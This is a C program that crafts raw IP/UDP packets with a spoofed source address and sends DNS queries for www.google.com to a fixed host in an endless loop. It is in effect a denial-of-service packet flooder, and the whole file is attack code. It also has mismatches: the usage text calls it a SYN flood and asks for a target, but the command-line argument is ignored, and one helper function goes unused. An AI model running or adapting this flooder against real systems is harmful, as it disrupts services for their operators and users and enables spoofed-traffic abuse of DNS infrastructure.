#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_PACKET_SIZE 1500
#define DNS_PORT 53
#define DEFAULT_SRC_IP "10.0.4.1"
#define DEFAULT_DST_IP "10.0.1.1"

struct pseudo_header {
    uint32_t src;
    uint32_t dst;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t udp_length;
};

struct dns_header {
    uint16_t tid;
    uint16_t flags;
    uint16_t nqueries;
    uint16_t nanswers;
    uint16_t nauth;
    uint16_t nother;
} __attribute__((packed));

// Internet checksum
unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

void encode_dns_query(char *buf, const char *hostname, int *query_len) {
    char *p = buf;
    const char delim[2] = ".";
    char tmp[64];
    strcpy(tmp, hostname);

    char *token = strtok(tmp, delim);
    while (token != NULL) {
        size_t len = strlen(token);
        *p++ = len;
        memcpy(p, token, len);
        p += len;
        token = strtok(NULL, delim);
    }

    *p++ = 0x00;          // End of host name
    *p++ = 0x00; *p++ = 0x01; // Type A
    *p++ = 0x00; *p++ = 0x01; // Class IN

    *query_len = p - buf;
}

uint32_t random_ipv4(void) {
    uint32_t addr;
    do {
        addr = rand();
    } while ((addr & 0xff) == 0 || (addr & 0xff) >= 224); // basic filter
    return addr;
}

uint16_t random_port(void) {
    return (rand() % (65535 - 1024)) + 1024;
}

int main(int argc, char *argv[]) {
    srand(time(NULL));

    if (argc <= 1) {
	printf("Please specify a target IP address, and optionally a port number (default destination port is 53).\nExample usage: syn_flood 127.0.0.1 80\n");
        exit(1);
    }
    
    char *src_ip_str = DEFAULT_SRC_IP;
    char *dst_ip_str = argv[1];
    
    printf("set ips\n");

    // if (argc > 1) {
    //     strcpy(dst_ip_str, argv[0]);
    // } else {
    //     printf("Please specify a target IP address, and optionally a port number (default destination port is 53).\nExample usage: syn_flood 127.0.0.1 80\n");
    //     exit(1);
    // }
    printf("set auth ips\n");

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        exit(1);
    }

    char datagram[MAX_PACKET_SIZE];
    memset(datagram, 0, MAX_PACKET_SIZE);

    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    struct dns_header *dnsh = (struct dns_header *)(datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
    char *dns_query = (char *)(datagram + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header));
    struct pseudo_header psh;
    int query_len;
    encode_dns_query(dns_query, "www.google.com", &query_len);

    // DNS Header
    dnsh->tid = htons(0x1234);
    dnsh->flags = htons(0x0100); // standard query
    dnsh->nqueries = htons(1);
    dnsh->nanswers = 0;
    dnsh->nauth = 0;
    dnsh->nother = 0;

    int dns_size = sizeof(struct dns_header) + query_len;
    int udp_len = sizeof(struct udphdr) + dns_size;
    int ip_len = sizeof(struct iphdr) + udp_len;

    // Destination
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(DNS_PORT);
    sin.sin_addr.s_addr = inet_addr(DEFAULT_DST_IP);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(ip_len);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(DEFAULT_SRC_IP);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));

    udph->source = htons(random_port());
    udph->dest = htons(DNS_PORT);
    udph->len = htons(udp_len);
    udph->check = 0;

    psh.src = iph->saddr;
    psh.dst = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(udp_len);

    //int psize = sizeof(struct pseudo_header) + udp_len;
    //char *pseudogram = malloc(psize);
    //memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    //memcpy(pseudogram + sizeof(struct pseudo_header), udph, udp_len);
    //udph->check = csum((unsigned short *)pseudogram, psize);
    //free(pseudogram);

    while (1) {
        udph->source = htons(random_port());
        udp_len = sizeof(struct udphdr) + sizeof(struct dns_header) + query_len;
        udph->len = htons(udp_len);
        ip_len = sizeof(struct iphdr) + udp_len;
        iph->tot_len = htons(ip_len);
        iph->check = 0;
        iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));
        int psize = sizeof(struct pseudo_header) + udp_len;
        char *pseudogram = malloc(psize);
        if (!pseudogram) {
            perror("malloc");
            exit(1);
        }

        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), udph, udp_len);
        udph->check = 0;  // Set to 0 before computing
        //udph->check = csum((unsigned short *)pseudogram, psize);
        free(pseudogram);
        if (sendto(sock, datagram, ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("sendto");
        } else {
            char src_buf[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &iph->saddr, src_buf, sizeof(src_buf));
            // printf("Sent packet from %s:%d with TID %x\n", src_buf, udph->source, dnsh->tid);
        }

    }

    close(sock);
    return 0;
}

